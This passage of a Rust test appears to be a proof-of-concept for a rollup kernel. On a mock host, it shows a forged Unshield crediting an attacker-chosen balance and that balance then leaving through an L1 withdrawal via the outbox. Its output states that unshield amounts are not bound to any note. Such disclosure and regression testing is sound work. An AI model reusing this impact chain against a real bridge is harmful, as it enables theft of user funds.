    let after_attack_ledger = read_ledger(&host).unwrap();

    // (1) Fresh nullifier is now consumed.
    assert!(
        after_attack_ledger.nullifiers.contains(&attacker_nullifier),
        "attacker nullifier must be in the kernel's nullifier set after forged Unshield",
    );

    // (2) Attacker-chosen recipient string has the drained balance.
    assert_eq!(
        after_attack_ledger.balances.get(attacker_recipient),
        Some(&drained_amount),
        "attacker recipient must hold the unshielded public balance",
    );

    // (3) Producer-fee note (cm_fee) was appended to the tree.
    assert!(
        after_attack_ledger.tree.leaves.contains(&attacker_cm_fee),
        "cm_fee note must be appended to the tree after forged Unshield",
    );

    // (4) Root history now contains the post-unshield root.
    assert!(
        after_attack_ledger.valid_roots.len() > pre_attack_ledger.valid_roots.len(),
        "unshield should snapshot a new root",
    );

    // ── Drain the funds to L1 with a follow-up Withdraw. ──────────────
    //
    // This demonstrates the complete end-to-end impact: the attacker can
    // now exit their forged balance as real L1 tokens via the outbox.
    let outbox_before = host.outputs.len();
    host.push_input(
        5,
        0,
        encode_external_kernel_message(KernelInboxMessage::Withdraw(KernelWithdrawReq {
            sender: attacker_recipient.to_string(),
            recipient: sample_l1_receiver().to_string(),
            amount: drained_amount,
        })),
    );
    run_with_host(&mut host);

    match read_last_result(&host).expect("withdraw produced a result") {
        KernelResult::Withdraw(resp) => {
            eprintln!(
                "[E2E PoC] kernel issued L1 withdrawal #{} for the forged funds",
                resp.withdrawal_index
            );
        }
        other => panic!(
            "follow-up Withdraw must succeed after forged Unshield: {:?}",
            other
        ),
    }

    let final_ledger = read_ledger(&host).unwrap();

    // (5) Withdrawal is recorded in state.
    assert_eq!(
        final_ledger.withdrawals.len(),
        1,
        "exactly one withdrawal should be enqueued from the attacker's forged funds",
    );
    assert_eq!(
        final_ledger.withdrawals[0].recipient,
        sample_l1_receiver(),
    );
    assert_eq!(final_ledger.withdrawals[0].amount, drained_amount);

    // (6) Outbox received a burn message for the attacker's L1 address.
    assert_eq!(
        host.outputs.len(),
        outbox_before + 1,
        "exactly one outbox message must have been emitted for the forged withdrawal",
    );
    assert!(
        host.store
            .contains_key(&indexed_path(PATH_WITHDRAWAL_PREFIX, 0)),
        "withdrawal record path must be populated in durable storage",
    );

    // (7) Bridge ticketer is still set (configuration was not clobbered).
    assert_eq!(
        host.read_store(PATH_BRIDGE_TICKETER, MAX_INPUT_BYTES)
            .as_deref(),
        Some(fixture.bridge_ticketer.as_bytes()),
    );

    eprintln!("[E2E PoC] full impact chain complete: forged Unshield → credited balance → L1 withdrawal via outbox.");
    eprintln!("  drained_amount = {} (attacker-chosen — apply_unshield does not bind v_pub to any deposit/note)", drained_amount);
    eprintln!("  attacker_recipient = {:?}", attacker_recipient);
    eprintln!("  attacker_nullifier = 0x{}", hex::encode(attacker_nullifier));
    eprintln!("  l1_withdrawal_recipient = {}", sample_l1_receiver());
    eprintln!("  outbox message emitted = {}", host.outputs.len() == outbox_before + 1);
}
